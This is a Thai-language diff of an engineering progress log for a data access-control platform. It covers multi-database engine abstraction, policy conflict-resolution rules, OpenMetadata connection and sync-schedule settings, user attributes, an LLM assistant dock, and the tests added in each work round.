+   **แสดง impact analysis ก่อน** (มี `ImpactAnalysis` อยู่แล้ว) เพราะ rollback คือการเปลี่ยน
+   สิทธิ์ของคนจริงย้อนกลับ ไม่ใช่การ undo ไฟล์
+5. **ปิด `audit_policy_change`** ให้ครบ — ใคร แก้อะไร ค่าเดิม→ค่าใหม่ เมื่อไหร่
+   (`policy_version` ตอบ "หน้าตาแต่ละเวอร์ชัน" แต่ตอบ "ใครกดอะไรตอนไหน" ได้ไม่ครบ เช่น
+   การเปลี่ยน lifecycle อย่างเดียว หรือการ resolve binding ใหม่)
+
+**ข้อควรระวัง** — `policy_version.document` เก็บ policy ทั้งใบ ซึ่งอาจมีชื่อคน/ชื่อทีมใน
+subject rule หน้า History จึงต้อง **จำกัดสิทธิ์เท่ากับหน้า policy เอง** ไม่ใช่เปิดกว้างกว่า
+เพราะมันคือข้อมูลชุดเดียวกันแค่เก่ากว่า
+
+### AP.7 M18 — รองรับ database type ใหม่โดยไม่ต้องไล่แก้ 14 จุด
+
+> `ต้องออกแบบให้ต่อได้หลาย database type ในอนาคตนะ คำนึงถึงเรื่องนี้แล้วหรือยัง`
+
+**คำตอบตรงๆ: คำนึงถึงแล้วครึ่งเดียว** — ครึ่งที่แพงถูกแล้ว ครึ่งที่ถูกกลับกระจาย
+
+**ส่วนที่พร้อมอยู่แล้ว (ไม่ต้องแตะตอนเพิ่ม engine)**
+
+| ของ | ทำไมถึงพร้อม |
+|---|---|
+| `PolicyDecision` | ไม่มีคำว่า SQL อยู่ในนั้นเลย — engine ตัดสินโดยไม่รู้ปลายทาง นี่คือผลตอบแทนของการลงทุนทำ Policy IR ตั้งแต่ M0 |
+| `SqlDialect` | interface 16 method · `ViewCompiler` + `DecisionSql` เรียกผ่าน interface ล้วน |
+| `engine_capability` | ความสามารถต่าง engine เป็น **data** (ตอนนี้ 25 แถว: POSTGRES 12 / SQLSERVER 13) |
+| `CredentialResolver` | แยกตาม scheme ไม่ใช่ตาม engine |
+| catalog / `asset_facet` | อิง FQN ล้วน |
+
+**ส่วนที่ hardcode อยู่ — นับได้ 14 จุด**
+
+| ไฟล์ | บรรทัด | อาการตอนเพิ่ม engine |
+|---|---|---|
+| `V1__catalog.sql` | 12 | `CHECK (engine IN ('POSTGRES','SQLSERVER'))` |
+| `V4__enforcement.sql` | 37 | `CHECK` ตัวเดียวกันอีกชุด |
+| `DataSourceStore.Engine` | 41-44 | enum — **อันนี้ดี** compiler จะชี้ให้เองว่าต้องแก้ที่ไหน |
+| `JdbcTargets` | 34-50 | switch สร้าง JDBC URL + ข้อความ `"Phase 1 can only connect to..."` |
+| `SourceProbe` | 108-127 | switch + probe SQL ต่อ engine |
+| `QueryService.dialectFor()` | 425-428 | `new PostgresDialect()` ตรงๆ ไม่มี registry |
+| `JdbcIntrospector` | — | `information_schema` ต่างกันแต่ละเจ้า |
+| frontend 6 ไฟล์ | — | `sources.ts` · `SourcesPage.tsx` · `PolicyBuilderPage.tsx` · `enforcement.ts` · `widgets.tsx` · test |
+
+⚠️ **จุดที่อันตรายจริงคือ 3 switch นั้น** — ลืมจุดเดียว**ไม่ error ตอน compile**
+แต่ไปพังตอน runtime ด้วยข้อความที่โกหกว่า *"Phase 1 ต่อได้แค่ POSTGRES กับ SQLSERVER"*
+ทั้งที่ความจริงคือเราลืมเติม case
+
+**สิ่งที่จะทำ — `SourceEngine` registry ตัวเดียว**
+
+1. `SourceEngine` (interface ใน `dac-common` หรือ `dac-connector-source`) ถือของที่เป็นของ
+   engine นั้นทั้งหมดไว้ที่เดียว:
+   - `id()` · `displayName()`
+   - `jdbcUrl(JdbcTarget)` + `driverClassName()`
+   - `dialect()` → `SqlDialect`
+   - `probeStatement()` · `readOnlySetup(Connection)`
+   - `introspection()` → ตัวอ่าน `information_schema` ของเจ้านั้น
+   - `defaultPort()` · `supportsSchemas()` (MySQL ไม่มีชั้น schema แยกจาก database — เป็น
+     ความต่างเชิงโครงสร้าง ไม่ใช่แค่ syntax ต้องเผื่อไว้ตั้งแต่ตอนออกแบบ interface)
+2. `SourceEngines.of(engineId)` เป็นทางเข้าเดียว — `JdbcTargets`, `SourceProbe`,
+   `QueryService.dialectFor()`, `JdbcIntrospector` เลิกมี switch ของตัวเอง
+3. **ย้าย `CHECK (engine IN (...))` เป็นตาราง reference `source_engine`** + FK
+   → เพิ่ม engine = insert แถว ไม่ใช่เขียน migration แก้ constraint
+   (ตาราง `engine_capability` อ้าง FK เดียวกัน)
+4. **Frontend อ่านรายการ engine จาก API** (`GET /v1/sources/engines`) แทนที่จะ hardcode
+   6 ไฟล์ → หน้า Register a source กับ Policy Builder ได้ตัวเลือกใหม่เองโดยไม่ต้อง deploy FE
+5. **test ที่บังคับความครบ** — วนทุก engine ที่ registry รู้จัก แล้วยืนยันว่ามี
+   dialect / probe / url template / capability rows ครบ **test นี้คือของที่ทำให้
+   "ลืมจุดเดียว" กลายเป็น compile-time problem แทน production problem**
+
+**ลำดับที่ถูกต้อง: ทำ M18 ก่อนเพิ่ม engine ตัวที่สาม ไม่ใช่หลัง**
+ถ้าเพิ่ม MySQL ไปก่อนแล้วค่อยมา refactor จะต้อง refactor ของ 3 engine พร้อมกัน
+และตอนนั้นจะมี 21 จุดแทนที่จะเป็น 14
+
+**ของที่ยังไม่ต้องรีบ** — `SqlDialect` ตอนนี้พอสำหรับ engine ตระกูล SQL
+แต่ถ้าวันหนึ่งต้องต่อของที่ไม่ใช่ SQL (Elasticsearch, MongoDB, REST API) `SqlDialect`
+จะไม่พอ ต้องยก abstraction ขึ้นไปอีกชั้นเป็น "compiler ต่อ target type"
+**ยังไม่ต้องทำตอนนี้** แต่ `SourceEngine` ควรถูกออกแบบให้ `dialect()` เป็น optional
+ตั้งแต่แรก จะได้ไม่ต้องรื้อรอบสอง
+
+### AP.7a M18 ฝั่ง proxy — **ทำไมเราไม่ทำแบบ Denodo (normalize ลง ANSI SQL)**
+
+> `ต้องออกแบบให้ต่อได้หลาย database type ในอนาคตนะ สำหรับวิธีการ Proxy ปรับมาทำส่วนนี้ก่อนเลย เพื่อสร้างฐานให้แข็งแรง`
+> `ได้ยินมาว่า Denodo ใช้ ASCII เลยหรอ เราต้องทำขนาดนั้นไหม หรือมี technique ที่ดีกว่า`
+
+**"ASCII" ที่ได้ยินมาน่าจะเป็น ANSI (SQL)** — Denodo มีภาษาของตัวเอง (**VQL**) และ normalize
+ทุก query ลง relational algebra กลาง แล้วให้ adapter แต่ละตัวประกาศ **delegation capability**
+ว่า push down อะไรได้ ส่วนที่ push down ไม่ได้ **ถูกดึงขึ้นมารันในเอนจินของ Denodo เอง**
+
+**เขาต้องทำแบบนั้นเพราะเขา join ข้าม source เรา *ไม่* join ข้าม source** — หนึ่ง query ไปหนึ่ง
+source เสมอ พอไม่ federate ภาษากลางก็ไม่มีประโยชน์ แถมมีโทษ 3 ข้อ:
+
+| โทษ | อธิบาย |
+|---|---|
+| **ปฏิเสธ SQL ที่ถูกต้องของ user** | `SELECT TOP 10` · `[bracket]` · `::cast` · `ILIKE` — คนเขียน syntax ของ engine ตัวเอง การ normalize ลง ANSI คือการบอกว่า "SQL ที่คุณเขียนถูกแต่เราไม่รับ" |
+| **จุดที่ semantic เพี้ยนได้** | normalize แล้ว render กลับ = แปลสองรอบ และการเพี้ยนของเรา**ไม่ใช่ query พัง** แต่คือ **mask หลุด** ซึ่งเป็นความผิดพลาดชนิดที่เงียบ |
+| **พาไปสู่การดึงข้อมูลขึ้นมากรองบนแอป** | ทางที่ ANSI พาไปคือ *"อันนี้แปลไม่ได้ ดึงขึ้นมาทำเองดีกว่า"* ซึ่งขัดกับคำตอบที่ให้ผู้ใช้ไว้ตรงๆ ว่า **เราแปลเป็น syntax ปลายทางแล้ว push down ไม่เคยดึงทั้งก้อนขึ้นมา** |
+
+**เทคนิคที่เลือกแทน — dialect-preserving rewrite + capability-declared fail-closed**
+
+```
+parse ด้วย grammar ของ engine นั้น (ไม่แปลงเป็นภาษากลาง)
+  → resolve table ref  → PolicyEngine → PolicyDecision
+  → แทนเฉพาะ FROM node + projection   (AST ส่วนที่เหลือไม่ถูกแตะเลย)
+  → unparse กลับด้วย dialect เดิม
+  → ถ้า dialect นั้นเขียน mask ตัวที่ decision สั่งไม่ได้ → ปฏิเสธทั้ง query (fail-closed)
+```
+
+ผลคือ **พื้นที่ที่ engine-specific เหลือแค่ 2 อย่าง และทั้งสองอย่างถูกประกาศไว้เป็นของที่จับต้องได้**
+— `SqlDialect` (วิธีเขียน mask / quote / cast) กับ `engine_capability` (ทำอะไรได้ ไม่ได้)
+นี่คือแนวคิด delegation capability ของ Denodo **โดยไม่ต้องแบกเอนจินของเขา**
+
+⚠️ **ข้อที่ห้ามลืมตอน implement:** `engine_capability` ปัจจุบันถูกใช้เตือนตอน *apply* ของ M5/M6
+แต่ฝั่ง proxy **ยังไม่มีใครถามมันเลย** — `QueryService` สมมติ PostgresDialect ตรงๆ
+(`dialectFor():425-428`) แปลว่าวันที่ต่อ engine ที่เขียน mask บางตัวไม่ได้ proxy จะ**เงียบ**
+ไม่ใช่ปฏิเสธ ซึ่งคือ mask หลุด **การเชื่อม capability เข้ากับ proxy คือหัวใจของสไลซ์นี้
+ไม่ใช่ของแถม**
+
+**ถ้าวันหนึ่งต้อง join ข้าม source จริงๆ** ค่อยใส่ **Calcite** เป็นชั้น federation ตอนนั้น
+(Calcite ให้ ANSI-normalize + per-dialect unparse มาในกล่องอยู่แล้ว) สิ่งที่ต้องระวัง**ตอนนี้**
+คือ **อย่าออกแบบอะไรที่ปิดทางนั้น** — ซึ่ง `SourceEngine` registry เปิดทางไว้พอดี เพราะ
+federation layer ในอนาคตก็จะถาม registry ตัวเดียวกันว่า engine ปลายทางทำอะไรได้บ้าง
+
+### AP.8 ลำดับที่แนะนำ
+
+```
+M9 + M13  ทำพร้อมกัน  (ปุ่มขอสิทธิ์ต้องมีปลายทางรับ)
+M14       ทำแยกได้เลย  (ไม่ขึ้นกับใคร แต่ต้องรอ M3 นิ่ง ซึ่งนิ่งแล้ว)
+M10 → M15 (ข)          (อธิบายกราฟที่ยังไม่มี ทำไม่ได้)
+M15 (ก)   ทำแยกได้เลย  (policy มีครบแล้ว LLM ต่อแล้ว)
+M13 → M16              (M16 ใช้ปุ่ม "ขอสิทธิ์" ของ M13 เป็นปลายทางของกองที่สอง
+                        และใช้ flag "ปฏิเสธโดยไม่บอกอะไร" ตัวเดียวกัน)
+M17       ทำแยกได้เลย  (ข้อมูลกับ endpoint มีครบแล้ว ขาดแค่หน้าจอ + diff + rollback)
+          แต่ข้อ 5 ของมัน (audit_policy_change) ควรทำคู่กับ M8 ที่ยังค้างอยู่
+M18 → M6  (M6 คือ NativeCompiler ต่อ engine — ถ้าทำ M6 ก่อน M18
+           จะได้ switch เพิ่มมาอีกชุดที่ต้องมารื้อทีหลัง)
+M18 ก่อนเพิ่ม engine ตัวที่ 3 เสมอ
+
+2026-09-24 ผู้ใช้สั่งสลับลำดับ: **M18 ขึ้นก่อนทุกอย่าง และเริ่มที่ฝั่ง proxy**
+  (`ปรับมาทำส่วนนี้ก่อนเลย เพื่อสร้างฐานให้แข็งแรง`) → เหตุผลอยู่ที่ AP.7a
+```
+
+---
+
+## รอบนี้ — **ของที่เคยต้อง redeploy ย้ายมาอยู่บนหน้าจอครบ 3 อย่าง** · **ผู้ช่วย LLM มีประตูเข้าแล้ว** · และ **เอกสารกติกาการชนกันของ policy ที่ผู้ใช้ขอ**
+
+> รอบนี้ยาวและกระจายหลายเรื่อง เพราะผู้ใช้ถามแทรกเป็นระยะ สรุปเป็นข้อๆ ตามลำดับที่ทำ
+
+### AQ.1 เอกสารกติกาการชนกันของ policy — และ **spec เดิมเขียนผิดอยู่สองที่**
+
+ผู้ใช้ถามสามข้อ (อยู่หลาย group / 1 group หลาย data policy / หลาย group หลาย policy จะเอาอันล่าสุดหรือกำหนดลำดับ) แล้วขอให้ **สรุปเป็นตารางไว้อธิบายทีม และใส่ไว้ในเอกสาร**
+
+**คำตอบยืนยันจากโค้ดจริง ไม่ใช่จากความจำ:**
+
+| กติกา | บรรทัดที่เป็นหลักฐาน |
+|---|---|
+| **ชั้นเดียวกัน = union** (ALLOW ใบเดียวที่ match ก็พอ) | `PolicyEngine.java:443` ใน `hasMatchedAllowAt()` — `if (c.layer() == layer && c.allows() && c.applies()) return true;` |
+| **ข้ามชั้น = intersection** และ **ชั้นที่ไม่มี ALLOW เลยไม่นับเป็นด่าน** | `PolicyEngine.java:346-348` — ถ้านับ จะกลายเป็นว่าไม่เขียน policy ระดับ SERVICE แล้วทั้ง estate เข้าไม่ได้ |
+| **row filter ทบกัน แล้ว AND** | `DecisionSql.java:155` — `return String.join(" AND ", parts);` (ทั้ง `ViewCompiler` และ `QueryRewriter` เดินผ่านตัวนี้ ซึ่งคือเหตุผลที่ FR-6.0c ทดสอบได้) |
+| **mask เข้มสุดชนะ เสมอกันคงของเดิม** | `MaskStrength.java:56` — `return rank(candidate) > rank(incumbent) ? candidate : incumbent;` → **ผลลัพธ์ไม่ขึ้นกับลำดับการ evaluate** |
+| **ไม่มี "เอาอันล่าสุด" และไม่มีเลขลำดับอยู่ในโมเดลเลย** | ค้นทั้ง repo แล้วไม่มี |
+
+**ของใหม่: [docs/policy-conflict-resolution.md](docs/policy-conflict-resolution.md)** — ภาษาไทย เขียนให้ **คนเขียน policy ที่ไม่ได้อ่านโค้ด** มีสรุป 5 บรรทัด · ตาราง conflict 12 แถว · ตารางลำดับความเข้มของ mask · ตัวอย่างเต็ม 6 เคส (รวมเคสที่คนพลาดบ่อยที่สุด — เขียน policy ระดับ TABLE เพื่อปลด mask ของ ORG แล้วไม่ติด) · และหัวข้อ "ทำไมไม่ใช้เอาอันล่าสุดหรือตั้งเลขลำดับ"
+
+🐛 **ระหว่างเขียนเจอว่า `docs/policy-spec.md` ผิดอยู่สองที่** (ไม่ใช่บั๊ก runtime แต่ใครอ่านแล้วเชื่อจะเขียน policy ผิด):
+1. ตารางลำดับความเข้มของ mask **หล่น `CONDITIONAL` หายไปทั้งตัว** — เขียนแค่ `NULLIFY > CONSTANT > HASH > REGEX_REPLACE > PARTIAL > ROUNDING > plaintext` ทั้งที่ `CONDITIONAL` มี rank 1 อยู่จริง แก้เป็นเขียนเลข rank กำกับครบและบอกว่าเสมอกันคงของเดิม
+2. **ไม่เคยเขียนเรื่อง union ภายในชั้นเดียวกันไว้เลย** — ข้อความเดิมอ่านแล้วเข้าใจได้ว่า ALLOW ทุกใบต้องผ่าน ซึ่งตรงข้ามกับที่ engine ทำ
+
+⚠️ **กับดักที่บันทึกไว้ให้เห็น: `CONDITIONAL` rank 1 อยู่ต่ำกว่า mask ธรรมดาทุกตัว** → `ROUNDING` ธรรมดาบน column เดียวกันชนะ cell mask **และเงื่อนไขหายไปทั้งก้อน** กลายเป็น mask แบบไม่มีเงื่อนไข — เขียนเตือนไว้ทั้งในเอกสารไทยและข้างตาราง masking function ใน spec แล้ว และใส่ไว้ใน Next Steps ว่าควรพิจารณาจัด rank ใหม่
+
+### AQ.2 M18 — ตอบคำถาม "ออกแบบให้ต่อได้หลาย database type แล้วหรือยัง"
+
+คำตอบตรงๆ คือ **คำนึงถึงแล้วครึ่งเดียว** — ครึ่งที่แพง (Policy IR / `SqlDialect` / `engine_capability`) ถูกแล้ว ครึ่งที่ถูกกลับกระจายอยู่ **14 จุด** และ 3 ใน 14 นั้นเป็น `switch` ที่ **ลืมแล้วไม่ error ตอน compile** แต่พังตอน runtime ด้วยข้อความที่โกหก
+
+รายละเอียดทั้งหมด + งานที่จะทำ (`SourceEngine` registry) อยู่ที่ **ข้อ AP.7** — และลำดับที่ห้ามสลับคือ **M18 ก่อน M6 และก่อนเพิ่ม engine ตัวที่ 3 เสมอ**
+
+### AQ.3 OpenMetadata connection แก้ได้จากหน้าจอแล้ว (V17)
+
+ผู้ใช้เจอว่า **ปุ่ม "Open in OpenMetadata" กดไม่ได้** แล้วพูดว่า *"จริงๆ ต้องใส่ URL ที่ถูกสิ"* ตามด้วย *"ต้องสามารถแก้ Instance หรือ Credential ได้สิ ทำให้เป็นแบบ configurable"*
+
+เดิม base URL กับ token มาจาก environment ล้วน → ย้ายลง DB:
+
+- **`V17__om_connection.sql`** — ตารางแถวเดียว (`id boolean PRIMARY KEY CHECK (id)`) เก็บ `base_url` + `jwt_token_cipher` + `webhook_secret_cipher` + `expected_version` + `fail_on_version_mismatch` + timeout สองตัว · **ความลับสองตัวถูก Fernet ด้วยกุญแจเดียวกับ credential อื่นทั้งระบบ** · `null` แปลว่า *"ใช้ของจาก environment ต่อไป"* → estate ที่ฉีด token มาทาง deployment ยังทำแบบเดิมได้โดยที่ยังย้าย URL จากหน้าจอได้
+- **`OmConnectionStore`** — `current()` / `save(Edit, actor, ip)` / `credentials()` · `Edit` ทุก field เป็น optional และ **field ที่เว้นว่างแปลว่าเก็บของเดิมไว้** บังคับด้วย `COALESCE(:token, om_connection.jwt_token_cipher)` ใน `ON CONFLICT DO UPDATE` ไม่ใช่ `excluded.` — ถ้าใช้ `excluded` การย้าย URL จะลบ token ทิ้งโดยไม่มีใครเชื่อมโยงสองเรื่องนี้เข้าด้วยกันได้
+- **`requireUrl()`** ปฏิเสธ: ไม่ใช่ http/https · ไม่มี host · มี `?` หรือ `#` (คือ URL ที่ copy จาก address bar) · และ **ลงท้ายด้วย `/api`** ซึ่งเป็นสิ่งที่คนพลาดบ่อยที่สุดเพราะมันคือ URL ที่อยู่ใน history ของ dev — พลาดแล้วจะได้ 404 ทุกครั้งโดยไม่มีอะไรบอกว่า "URL ผิด" · **ยอมให้ private/loopback** ต่างจาก `LlmGatewayUrl` เพราะนี่คือ catalog ของแพลตฟอร์มเองที่ admin เป็นคนตั้ง ไม่ใช่ address ที่ user พิมพ์เข้ามา
+- **`OpenMetadataSettingsResource`** — `@Secured("PLATFORM_ADMIN")` ทั้ง class · `PUT` บันทึกแล้ว **`client.reconfigure(...)` ในคอลเดียวกัน** (setting ที่ต้อง restart คือ setting ที่ดูเหมือนพัง) · `POST /test` **รับ candidate** → ทดสอบ address ใหม่ก่อน save ได้ ด้วย `OpenMetadataClient` ตัวใช้แล้วทิ้ง — reconfigure ตัวจริงเพื่อ probe แปลว่าเอา crawler ไปชี้ instance ที่ยังไม่มีใครตกลง และถ้า probe fail มันจะค้างอยู่ตรงนั้น · candidate ที่ไม่ใส่ token ใช้ token เดิม probe
+- **หน้าจอ** — section ใหม่ **"Change the connection"** ใน `OpenMetadataSettingsPage.tsx` (เปิดด้วยปุ่ม Edit) · base URL / expected version / timeout 2 ช่อง / toggle fail-on-mismatch / **bot token + webhook secret เป็น `type="password"` ที่เว้นว่าง = คงของเดิม** / ช่องเหตุผล / ปุ่ม **Test before saving** · **Save** · **Discard**
+- **หลังบันทึกจะ invalidate `sync-status` / `vocabulary` / `catalog`** เพราะการย้าย catalog เปลี่ยนความหมายของ asset, tag และ term ทุกตัวที่ค้างอยู่บนจอ
+
+⚠️ **กติกาที่ห้ามถอด** — ความลับ **ไม่เคยถูกส่งกลับ browser ในรูปแบบใดเลย** ไม่ใช่ค่า ไม่ใช่ prefix ไม่ใช่ความยาว · `describe()` ตอบแค่ `tokenConfigured` เป็น boolean · ฝั่ง frontend สัญญาว่า **ช่องความลับที่ไม่ได้แตะต้องส่ง `undefined` ไม่ใช่ `''`** เพราะ `''` อ่านได้ว่า "ล้างทิ้ง" — มีเทสต์ยืนยันข้อนี้โดยเฉพาะ (`OpenMetadataSettingsPage.test.tsx`)
+
+### AQ.4 เวลาของ nightly reconcile ตั้งเองได้ (V15)
+
+*"Schedule Sync อยากให้สามารถกำหนดเวลาเองได้ เห็นตอนนี้ Sync ตอน 02:30 Asia/Bangkok"*
+
+- **`V15__sync_schedule.sql`** — `om_sync_schedule` แถวเดียว เก็บ `enabled` + `run_at time` + `zone` · **เก็บเป็นเวลาท้องถิ่นใน zone ไม่ใช่ UTC** เพราะความหมายของ setting คือ "ตีสองครึ่งที่ data centre" ซึ่ง UTC instant จะเลิกแปลว่าอย่างนั้นทันทีที่เจอ daylight saving · `enabled = false` คือค่าจริง ไม่ใช่แถวที่หายไป — estate ที่ crawl จาก pipeline เองต้องการปิด backstop **อย่างตั้งใจ** ซึ่งต้องแยกจาก "ยังไม่มีใคร config"
+- **`NightlyReconcile` อ่านใหม่ก่อนจองทุกครั้ง** → save แล้วขยับรอบ**คืนนี้** ไม่ใช่รอบหน้าสัปดาห์
+- **`ScheduleEditor`** ในหน้า OM settings — พิมพ์เวลา + zone (datalist จาก `Intl.supportedValuesOf('timeZone')` แต่พิมพ์เองได้ และ server validate เสมอ) · แสดง **สามเวลา** เพราะมันตอบคนละคำถาม: ค่าที่เก็บ / ค่าที่ไฟล์ service ขอไว้ตอนแรก / **รอบที่จองไว้จริง** — schedule เปิดอยู่ในโปรเซสที่ไม่ได้รัน backstop ได้ และทางเดียวที่จะพูดตรงๆ คือพิมพ์การจองออกมา
+
+### AQ.5 เพิ่ม user attribute จากหน้าจอ ARAK ได้ (V16)
+
+*"อยากให้เพิ่ม User Attribute ได้จากหน้าจอของ Arak เลย"* / *"นอกจาก Sync มาแล้ว ยังสามารถเพิ่มได้ที่ Arak"*
+
+- ตัว storage **ไม่ต้องเปลี่ยนเลย** — `principal_attribute.source` แยก `local` / `entra` / `openmetadata` อยู่แล้ว และ sync เขียนเฉพาะแถวของตัวเอง → **ค่าที่พิมพ์เองจะไม่ถูก sync ทับ และไม่ทับของ sync**
+- ที่ต้องแก้คือ **audit** — `audit_identity_change` เดิมบรรยาย role grant อย่างเดียว ไม่มีที่เก็บว่า attribute ไหนค่าอะไร → **`V16__local_attributes.sql`** เพิ่ม `attr_key` / `attr_value` และขยาย action list
+- **เก็บ value เต็มโดยตั้งใจ** — *"มีคนแก้ clearance"* ไม่ใช่คำตอบที่ auditor ใช้ได้ *"clearance L3 ถูกเพิ่มให้ analyst_a โดย admin"* ใช่ · ค่าพวกนี้คือ governance label ไม่ใช่ความลับ ความลับคือข้อมูลที่มันไขได้ ซึ่งเป็นเหตุผลที่ label ต้องมีร่องรอย
+- `POST` / `DELETE /v1/principals/{id}/attributes` + หน้าจอใน Principal detail
+
+### AQ.6 ผู้ช่วย LLM มีประตูเข้าแล้ว — `AssistDock` + mascot
+
+*"An LLM ไม่เห็นมีอยู่ในหน้า Query หรือสร้าง Policy เลยอะ ตอนที่เปิดแล้ว"* และ *"ตัว mascot ในภาพ mascot.png ทำเป็น mascot วิ่งบนหน้าจอ... หรือจะอยู่มุมขวาเป็น AI Assistance Chatbot"* → ผู้ใช้เลือก *"วางขวา corner เล็กๆ จะขึ้นมาถ้าเรากด"*
+
+- **`frontend/app/src/assist/AssistDock.tsx`** (474 บรรทัด) + `assistStore.ts` — ปุ่มเล็กมุมขวาล่าง **ไม่ทำอะไรเลยจนกว่าจะกด** · **ไม่มี idle animation ไม่มีเด้ง** — console ที่งานคือทำให้คำเตือนสะดุดตา ห้ามมีอย่างอื่นขยับแข่ง
+- **mascot 4 ท่าเป็น state ไม่ใช่ของประดับ** (`greet` / `thinking` / `cheer` / `shield`) เปลี่ยนท่าเมื่อ state เปลี่ยนเท่านั้น
+- **วาดให้เฉพาะคนที่เปิด assistant ไว้และ gateway ตอบจริง** — โฆษณาฟีเจอร์ที่ยังไม่ได้ config ไม่ใช่ฟีเจอร์
+- **`LlmAssistResource`** — `POST /v1/llm/assist/sql` และ `/policy` · **`AssistPrompts` ส่งแต่ metadata ไม่มีค่าข้อมูลจริงสักแถว** บังคับด้วยโครงสร้าง และ assert ด้วย `AssistPromptsTest.carriesNoValues` / `draftsOnly` · **ไม่มี write path ไป activate policy** (FR-2.6 separation of duty) — ผลที่ออกมาเป็น draft ให้คนตรวจเสมอ
+
+### AQ.7 Pager ตัวเดียวใช้ร่วมกัน + หน้า Policies มี paging
+
+*"หน้า policy ทำเป็น paging ด้วยดีไหม จะได้ไม่ยาวเกิน"* และก่อนหน้านั้น *"ความยาวของกรอบแสดงผล Asset ต่อ 1 page ให้เท่ากับที่ filter สิ"*
+
+- **`frontend/app/src/components/Pager.tsx`** — ตัวเดียว ใช้ทั้ง `CatalogPage` และ `PolicyListPage` · การมี pager สองตัวที่หน้าตาเกือบเหมือนกันคือทางที่ทำให้มันค่อยๆ ต่างกัน
+- หน้า Policies ได้ทั้ง **ค้นหา** (รอบก่อน) และ **paging** (รอบนี้)
+
+### AQ.8 ชิป `?` กลายเป็นคำว่า `unconfirmed`
+
+ผู้ใช้ชี้ที่ชิปแล้วถามว่า *"อันนี้หมายถึงอะไรนะ เครื่องหมาย ?"* — **การที่ต้องถามคือคำตอบทั้งหมดว่ามันใช้ได้ไหม** `?` ถูกอ่านเป็นปุ่ม help
+
+เปลี่ยนเป็นคำว่า **`unconfirmed`** และ tooltip เขียนว่า *"suggested by OpenMetadata, not confirmed by anyone — no policy enforces on it unless one opts in"* ซึ่งคือสิ่งที่ ARAK ทำจริงตาม FR-1.3a ไม่ใช่การ echo คำว่า `state Suggested` ของ OM ที่ไม่มีความหมายกับคนที่ไม่ได้อ่าน spec
+
+### AQ.9 ซ่อน Enforcement กับ Access ออกจาก rail
+
+*"Hide Tab Enforcement, Access ก่อน เนื่องจากยังไม่เสร็จใช่ไหม เดี๋ยวเสร็จค่อยเอากลับมา"*
+
+`NavSection` ได้ field **`hidden?: boolean`** — ⚠️ **ไม่ใช่ permission** มันซ่อนจากทุกคนรวมทั้ง admin และไม่ได้ปิดกั้นอะไรที่ใครจะเข้าถึงได้อยู่แล้ว · **route ยังอยู่** bookmark หรือลิงก์จากเอกสารยังลงที่ placeholder ที่อธิบายตัวเองได้ ไม่เด้งกลับหน้าแรก
+
+**เอากลับเมื่อไหร่ (เขียนไว้ในโค้ดแล้ว):** Enforcement → พร้อมกับ M5 slice ที่มี apply/rollback · Access → พร้อมกับหน้า overview ของ M8
+
+### AQ.10 "Open in OpenMetadata" ต่อถึงของจริง
+
+`OpenMetadataLink` สร้าง URL ของ asset ในคอนโซล OM จาก FQN + entity type แล้วหน้า Asset detail มีปุ่มพาไปตรงหน้านั้น — และนี่คือจุดที่พาไปสู่ AQ.3 ทั้งข้อ เพราะปุ่มนี้จะถูกก็ต่อเมื่อ base URL ถูก
+
+### AQ.11 เทสต์ที่เพิ่มรอบนี้
+
+| ไฟล์ | คุมอะไร |
+|---|---|
+| `OmConnectionStoreTest` | `requireUrl()` — รับ console root / ตัด trailing slash / **ปฏิเสธ `/api` ทั้งแบบมีและไม่มี slash ปิดท้าย** (เช็คต้องรันหลัง trim) / ปฏิเสธ scheme อื่น / ไม่มี host / มี `?` หรือ `#` / ว่าง |
+| `OpenMetadataSettingsPage.test.tsx` | **ช่องความลับที่ไม่ได้แตะส่ง `undefined` ไม่ใช่ `''`** · ช่องที่พิมพ์จริงส่งไป · **Test ยิง address ที่อยู่บนจอ ไม่ใช่ตัวที่ใช้อยู่ และไม่บันทึกอะไร** · Discard คืนค่าที่ server บอก · non-admin ไม่เห็นอะไรเลย |
+| `SyncScheduleTest` | เวลาท้องถิ่น + zone + การคำนวณรอบถัดไป |
+| `AssistPromptsTest` | **`carriesNoValues`** — prompt ไม่มีค่าข้อมูลจริง · **`draftsOnly`** — ผลลัพธ์เป็น draft เท่านั้น |
+| `HomeLayoutValidatorTest` / `HomeLayoutStoreTest` / `HomeLayoutStoreIT` | HTML ที่ผู้ใช้พิมพ์เอง (stored XSS) ถูกล้างทั้งตอนเขียนและตอนอ่าน |
+| `CredentialResolverTest` | resolver ที่ไม่มีกุญแจต้องปฏิเสธ ไม่ใช่เงียบ |
+| `OpenMetadataLinkTest` | URL ของ asset ใน OM |
+
+## รอบก่อนหน้า — **กลับคำเรื่อง Credential: พิมพ์ username/password ลงหน้าจอได้แล้ว** · **Test connection ก่อน save** · และ **LLM ต่อ per-user สำเร็จจริง (M11 ไม่ใช่ "ยังไม่เริ่ม" อีกแล้ว)**
+
+### AO.1 ผู้ใช้ถามสองข้อที่เป็นเรื่องเดียวกัน
+
+> `Register a source ไม่เห็นมีที่ให้ test Connection ก่อน save`
+> `Credential reference คืออะไร ทำไมไม่ให้ใส่ username password ในหน้าจออะ ตอน Register datasource หรือ ตอน LLM`
+
+ข้อแรกเป็นช่องโหว่ของ UX ตรงๆ — backend มี `POST /v1/sources/{id}/test` มาตั้งแต่ต้น แต่มันเทสต์ได้เฉพาะ source ที่ **บันทึกไปแล้ว** คนที่กรอกฟอร์มอยู่จึงต้องเดาว่าพิมพ์ host ถูกไหม กด Register ไปก่อน แล้วค่อยรู้ว่าผิด
+
+ข้อสองใหญ่กว่า และคำตอบเดิมของเราผิด
+
+### AO.2 เหตุผลเดิม และทำไมมันไม่สมเหตุสมผล
+
+กฎเดิมคือ `credential_ref` ต้องเป็น **ตัวชี้** ไปที่ secret store เท่านั้น (`vault://` / `azurekeyvault://` / `env:`) — `DataSourceStore.validate()` ปฏิเสธทุกอย่างที่ไม่ขึ้นต้นด้วยสามอันนี้ เหตุผลที่เขียนไว้ใน class doc คือ *"the moment a console accepts a password in a text box, the password is in the database, the backups and somebody's screen recording"*
+
+ปัญหาคือ **มันไม่ได้ทำให้ password หายไปจากระบบ มันแค่ย้ายที่** ในทางปฏิบัติคนที่ไม่มี Vault ก็ไปใส่ไว้ใน environment variable ของ process ซึ่ง:
+
+- ไม่มี audit trail ว่าใครเปลี่ยนเมื่อไหร่
+- เปลี่ยนทีต้อง restart backend
+- อยู่ใน `.env` ที่ `docker inspect` / `ps e` อ่านได้
+- และคนที่ตั้งมันคือคนเดียวกับที่ตั้ง `FERNET_KEY` อยู่แล้ว
+
